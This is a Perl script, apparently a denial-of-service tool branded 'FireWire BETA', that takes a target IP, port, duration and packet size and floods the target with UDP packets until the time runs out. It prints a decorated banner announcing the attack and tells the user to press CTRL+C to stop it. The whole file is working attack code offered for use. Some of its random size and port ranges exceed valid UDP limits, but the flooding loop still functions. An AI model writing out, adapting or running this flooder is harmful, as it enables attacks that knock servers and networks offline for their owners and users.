#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;


##
# ServerSpots
##

use Socket;
use strict;

my ($ip,$port,$time,$size) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 999999);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD RED<<EOTEXT;

███████╗██╗██████╗░███████╗░██╗░░░░░░░██╗██╗██████╗░███████╗
██╔════╝██║██╔══██╗██╔════╝░██║░░██╗░░██║██║██╔══██╗██╔════╝
█████╗░░██║██████╔╝█████╗░░░╚██╗████╗██╔╝██║██████╔╝█████╗░░
██╔══╝░░██║██╔══██╗██╔══╝░░░░████╔═████║░██║██╔══██╗██╔══╝░░
██║░░░░░██║██║░░██║███████╗░░╚██╔╝░╚██╔╝░██║██║░░██║███████╗
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝
                         🇧​​​​​🇪​​​​​🇹​​​​​🇦​​​​​

           FɪʀᴇWɪʀᴇ ɪs ʜᴇᴀᴛɪɴɢ ᴜᴘ​​​​​ $ip
                     𝙤𝙣 𝙥𝙤𝙧𝙩 $port
	           𝗳𝗼𝗿 $time 𝙎𝙚𝙘𝙤𝙣𝙙𝙨

             Press CTRL+C to stop the attack
EOTEXT


 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500000)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}